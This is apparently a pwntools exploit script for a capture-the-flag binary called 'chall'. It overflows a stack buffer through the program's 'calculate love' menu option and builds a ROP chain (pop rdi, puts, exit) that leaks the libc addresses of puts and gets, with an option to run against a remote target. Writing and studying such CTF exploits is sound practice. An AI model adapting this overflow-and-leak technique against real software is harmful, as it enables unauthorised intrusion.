from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def enter_name(self, name):
        p = self.p
        p.sendlineafter(b"Please enter your name: ", name)

    def calculate_love(self, lucky_name):
        p = self.p
        p.sendlineafter(b"Please choose what you would like to do: ", b"2")
        p.sendlineafter(b"Enter the name of the lucky one ;): ", lucky_name)

    def you_cant_see_me(self, name):
        p = self.p
        p.sendlineafter(b"are you?", name)

    def leak(self, address) -> bytes:
        p = self.p
        self.enter_name(b"dimas")
        rp = ROP(exe)
        pay = flat(
            cyclic(120),
            rp.find_gadget(['ret'])[0],
            rp.find_gadget(['pop rdi', 'ret'])[0],
            address,
            exe.sym['puts'],
            exe.sym['exit']
        )
        self.calculate_love(pay)

        return p.recvline().strip()[::-1].hex()


def leak(name):
    x, p = init()
    x.debug("break *analyze_name+261")
    puts_leak = x.leak(exe.got[name])
    log.success(f"{name} @ {puts_leak}")
    p.close()
    
    return puts_leak


leak('puts')
leak('gets')